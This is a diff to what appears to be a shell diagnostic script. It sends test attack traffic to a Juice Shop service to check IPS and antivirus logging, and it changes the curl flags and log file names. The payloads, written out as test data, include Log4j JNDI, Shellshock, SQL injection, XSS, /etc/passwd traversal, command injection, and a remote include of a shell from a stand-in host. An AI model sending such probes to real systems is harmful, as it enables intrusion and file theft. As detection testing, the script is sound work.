@@ -539,52 +539,52 @@ function test_diag2() {
         local logfile_name="traffic.0"
         ;;
     log4j)
-        local payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
+        local payload='curl -s -I --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
         local logfile_name="ips.0"
         ;;
     shellshock)
-        local payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+        local payload='curl -s -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
         local logfile_name="ips.0"
         ;;
     sql_injection)
-        local payload='curl -s --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
+        local payload='curl -s -I --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
         local logfile_name="ips.0"
         ;;
     xss)
-        local payload='curl -s --max-time 5 --data "search=<script>alert(1)</script>"'
+        local payload='curl -s -I --max-time 5 --data "search=<script>alert(1)</script>"'
         local logfile_name="ips.0"
         ;;
     lfi)
-        local payload='curl -s --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
+        local payload='curl -s -I --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
         local logfile_name="ips.0"
         ;;
     rfi)
-        local payload='curl -s --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
+        local payload='curl -s -I --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
         local logfile_name="ips.0"
         ;;
     cmd_injection)
-        local payload='curl -s --max-time 5 --data "input=1; cat /etc/passwd"'
+        local payload='curl -s -I --max-time 5 --data "input=1; cat /etc/passwd"'
         local logfile_name="ips.0"
         ;;
     directory_traversal)
-        local payload='curl -s --max-time 5 "http://target.com/../../../../etc/passwd"'
+        local payload='curl -s -I --max-time 5 "http://target.com/../../../../etc/passwd"'
         local logfile_name="ips.0"
         ;;
     user_agent_malware)
-        local payload='curl -s --max-time 5 -H "User-Agent: BlackSun"'
+        local payload='curl -s -I --max-time 5 -H "User-Agent: BlackSun"'
         local logfile_name="ips.0"
         ;;
     eicar)
-        local payload='curl -s --max-time 5 --data "$(echo 'WDUhUCUAQFswXFBaWDU0KFApKTdDQyl9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' | base64 --decode)"'
-        local logfile_name="av.0"
+        local payload='curl -s -I --max-time 5 --data "$(echo 'WDUhUCUAQFswXFBaWDU0KFApKTdDQyl9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' | base64 -d)"'
+        local logfile_name="virus.0"
         ;;
     trojan)
-        local payload='curl -s --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9dHJvamFuX3NpZ25hdHVyZQ==' | base64 --decode)"'
-        local logfile_name="av.0"
+        local payload='curl -s -I --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9dHJvamFuX3NpZ25hdHVyZQ==' | base64 -d)"'
+        local logfile_name="virus.0"
         ;;
     worm)
-        local payload='curl -s --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9d29ybV9zaWduYXR1cmU=' | base64 --decode)"'
-        local logfile_name="av.0"
+        local payload='curl -s -I --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9d29ybV9zaWduYXR1cmU=' | base64 -d)"'
+        local logfile_name="virus.0"
         ;;
     *)
         local payload='curl -s -I --max-time 5'
@@ -1877,9 +1877,9 @@ case "$1" in
                ["user_agent_malware"]="ips.0"
                ["sql_injection"]="ips.0"
                ["directory_traversal"]="ips.0"
-               ["eicar"]="av.0"
-               ["trojan"]="av.0"
-               ["worm"]="av.0"
+               ["eicar"]="virus.0"
+               ["trojan"]="virus.0"
+               ["worm"]="virus.0"
            )
            for attack in "${!attack_types[@]}"; do
                send_attack_traffic 'app=diag2' 'backend' 'juiceshop-service' 'security' "$attack" "${attack_types[$attack]}" || exit 1
